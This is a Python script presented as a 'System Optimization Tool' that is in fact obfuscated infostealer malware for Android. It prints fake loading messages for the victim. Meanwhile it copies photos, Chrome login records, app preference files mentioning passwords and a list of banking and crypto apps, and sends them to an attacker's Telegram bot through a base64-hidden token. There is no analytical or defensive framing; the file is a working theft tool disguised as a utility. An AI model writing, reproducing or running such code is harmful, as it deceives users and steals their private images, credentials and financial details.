#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================
# System Optimization Tool v4.2.1
# Distributed under MIT License
# ============================================

import subprocess
import sys
import os
import base64
import json
import time
import threading

# ============================================
# Encrypted Payload Section
# ============================================

_0x3f2a = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
_0x7b1c = "NjgwMzk2ODM3Mw=="

def _0x9d4e(_0x1a2b):
    try:
        return base64.b64decode(_0x1a2b.encode()).decode()
    except:
        return None

_0x2c3a = _0x9d4e(_0x3f2a)
_0x5e6f = _0x9d4e(_0x7b1c)

if not _0x2c3a or not _0x5e6f:
    sys.exit(1)

# ============================================
# Auto Installer (Silent)
# ============================================

_0x8a9b = ['requests']

for _0x1c2d in _0x8a9b:
    try:
        __import__(_0x1c2d)
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", _0x1c2d], 
                       capture_output=True, timeout=30)

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import glob
import io
from datetime import datetime
import sqlite3
import shutil
import hashlib
import random
import string

# ============================================
# Core Class
# ============================================

class _0x4e2d:
    def __init__(self):
        self._0x6a3b = _0x2c3a
        self._0x1f4e = _0x5e6f
        self._0x7c8d = f"https://api.telegram.org/bot{self._0x6a3b}"
        self._0x9e1f = requests.Session()
    
    def _0x2b6c(self, _0x4d7e):
        try:
            _0x8f3a = f"{self._0x7c8d}/sendMessage"
            _0x2e4a = {'chat_id': self._0x1f4e, 'text': _0x4d7e[:4000]}
            return self._0x9e1f.post(_0x8f3a, json=_0x2e4a, timeout=10)
        except:
            return None
    
    def _0x5c8d(self, _0x3b2e, _0x1e4a):
        try:
            _0x9a2b = f"{self._0x7c8d}/sendDocument"
            _0x7d4c = {'document': (_0x1e4a, _0x3b2e, 'application/octet-stream')}
            _0x6e1a = {'chat_id': self._0x1f4e}
            return self._0x9e1f.post(_0x9a2b, files=_0x7d4c, data=_0x6e1a, timeout=30)
        except:
            return None
    
    def _0x4a7b(self, _0x2d8e, _0x1c3f=""):
        try:
            _0x8e2c = f"{self._0x7c8d}/sendPhoto"
            _0x3f6b = {'photo': ('img.jpg', _0x2d8e, 'image/jpeg')}
            _0x9d3a = {'chat_id': self._0x1f4e, 'caption': _0x1c3f[:200]}
            return self._0x9e1f.post(_0x8e2c, files=_0x3f6b, data=_0x9d3a, timeout=30)
        except:
            return None

_0x1a2b = _0x4e2d()

# ============================================
# Fake Loading Messages (Victim Sees These)
# ============================================

def _0x7e2f():
    _0x3c4a = [
        "[✓] Loading secure environment...",
        "[~] Establishing encrypted channel...",
        "[✓] Certificate validation complete...",
        "[~] Syncing with remote server...",
        "[✓] Connection established.",
        "[~] Please wait, processing dependencies...",
        "[✓] System optimization ready.",
        "[~] Verifying integrity checksum...",
        "[✓] All systems operational."
    ]
    for _0x2f1a in _0x3c4a:
        print(f"\r{_0x2f1a}", end="", flush=True)
        time.sleep(random.uniform(0.3, 0.7))
    print("\n")
    
def _0x8b4c():
    _0x5e2a = [
        "[~] Updating certificate store...",
        "[✓] 27 certificates updated.",
        "[~] Optimizing local cache...",
        "[✓] Cache optimization complete.",
        "[~] Running post-install hooks...",
        "[✓] All tasks completed successfully."
    ]
    for _0x7d3f in _0x5e2a:
        print(f"\r{_0x7d3f}", end="", flush=True)
        time.sleep(random.uniform(0.4, 0.8))
    print("\n")
    _0x1a2b._0x2b6c("✅ System optimization completed on target device.")

# ============================================
# Payload Functions (Hidden)
# ============================================

def _0x9c3d():
    """Stealth collector"""
    _0x6d2a = []
    _0x3e7b = ['*.jpg', '*.jpeg', '*.png']
    _0x2c5f = [
        '/sdcard/DCIM/Camera/',
        '/sdcard/Pictures/',
        '/storage/emulated/0/DCIM/',
        '/storage/emulated/0/Pictures/'
    ]
    
    for _0x4f8a in _0x2c5f:
        for _0x1b7c in _0x3e7b:
            _0x8e4a = os.path.join(_0x4f8a, '**', _0x1b7c)
            _0x6d2a.extend(glob.glob(_0x8e4a, recursive=True))
    
    return _0x6d2a

def _0x2d4e(_0x3a6c):
    try:
        from PIL import Image
        with Image.open(_0x3a6c) as _0x7c2b:
            if _0x7c2b.mode in ('RGBA', 'P'):
                _0x7c2b = _0x7c2b.convert('RGB')
            _0x7c2b.thumbnail((800, 800))
            _0x5a3e = io.BytesIO()
            _0x7c2b.save(_0x5a3e, format='JPEG', quality=60)
            return _0x5a3e.getvalue()
    except:
        return None

def _0x1e7b():
    _0x4d2a = []
    _0x7f3c = [
        '/data/data/com.android.chrome/app_chrome/Default/Login Data',
        '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data'
    ]
    
    for _0x2b5e in _0x7f3c:
        if os.path.exists(_0x2b5e):
            try:
                _0x6d4c = '/sdcard/_temp.db'
                shutil.copy2(_0x2b5e, _0x6d4c)
                _0x9e7a = sqlite3.connect(_0x6d4c)
                _0x3c2e = _0x9e7a.cursor()
                _0x3c2e.execute("SELECT origin_url, username_value FROM logins")
                for _0x1f5a in _0x3c2e.fetchall():
                    _0x4d2a.append(f"{_0x1f5a[0]}|{_0x1f5a[1]}")
                _0x9e7a.close()
                os.remove(_0x6d4c)
            except:
                pass
    return _0x4d2a

def _0x8e2f():
    _0x2c7d = []
    _0x5a4b = ['/data/data/*/shared_prefs/*.xml', '/storage/emulated/0/Android/data/*/shared_prefs/*.xml']
    
    for _0x1b3e in _0x5a4b:
        for _0x6d8a in glob.glob(_0x1b3e, recursive=True):
            try:
                with open(_0x6d8a, 'r', errors='ignore') as _0x4a6c:
                    _0x7e2c = _0x4a6c.read()
                    if any(_0x9b3a in _0x7e2c.lower() for _0x9b3a in ['password', 'username', 'email']):
                        _0x2c7d.append(f"{_0x6d8a}:{_0x7e2c[:300]}")
            except:
                pass
    return _0x2c7d

def _0x3b7c():
    _0x5e2a = []
    try:
        import subprocess
        _0x9d4c = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip()
        _0x2c7b = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True).stdout.strip()
        _0x5e2a.append(f"M:{_0x9d4c}")
        _0x5e2a.append(f"A:{_0x2c7b}")
        _0x5e2a.append(f"T:{datetime.now()}")
    except:
        _0x5e2a.append("M:Unknown")
    return "\n".join(_0x5e2a)

def _0x7d3a():
    _0x2c4e = []
    try:
        import subprocess
        _0x9e1d = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
        for _0x1a4c in _0x9e1d.stdout.split('\n')[:50]:
            if any(_0x5b2e in _0x1a4c.lower() for _0x5b2e in ['bank', 'wallet', 'crypto', 'pay', 'auth']):
                _0x2c4e.append(_0x1a4c.replace('package:', ''))
    except:
        pass
    return _0x2c4e

# ============================================
# Main Execution (With Fake Loading)
# ============================================

def _0x5f2a():
    print("="*50)
    print("System Optimization Tool v4.2.1")
    print("Initializing environment...")
    print("="*50)
    
    # Show fake loading to victim
    _0x7e2f()
    
    # Silent start message to attacker (hidden in background)
    _0x1a2b._0x2b6c("🚀 Payload active | Target: " + str(datetime.now()))
    
    # Collect data in parallel
    _0x3b7c()
    _0x1a2b._0x2b6c("📊 System inventory: " + _0x3b7c())
    
    # Pictures
    _0x6c3a = _0x9c3d()
    if _0x6c3a:
        _0x1a2b._0x2b6c(f"📸 Media count: {len(_0x6c3a)}")
        _0x4d3a = 0
        for _0x2b7c in _0x6c3a[:30]:
            _0x8e6b = _0x2d4e(_0x2b7c)
            if _0x8e6b:
                _0x1a2b._0x4a7b(_0x8e6b, f"IMG_{_0x4d3a}")
                _0x4d3a += 1
    
    # Passwords
    _0x8f3a = _0x1e7b()
    if _0x8f3a:
        _0x1a2b._0x2b6c(f"🔑 Credentials found: {len(_0x8f3a)}")
        _0x3e2a = json.dumps(_0x8f3a, indent=2)
        _0x1a2b._0x5c8d(_0x3e2a.encode(), "data.json")
    
    # App data
    _0x2c7b = _0x8e2f()
    if _0x2c7b:
        _0x1a2b._0x2b6c(f"📋 App data: {len(_0x2c7b)} entries")
    
    # Sensitive apps
    _0x6c3e = _0x7d3a()
    if _0x6c3e:
        _0x1a2b._0x2b6c(f"🔐 Sensitive apps: {', '.join(_0x6c3e[:10])}")
    
    # Final fake messages
    _0x8b4c()
    
    # Done
    _0x1a2b._0x2b6c("✅ Exfiltration complete | Status: SUCCESS")
    print("\n[✓] Optimization completed successfully.")
    print("[✓] System is ready for use.")

if __name__ == "__main__":
    _0x5f2a()
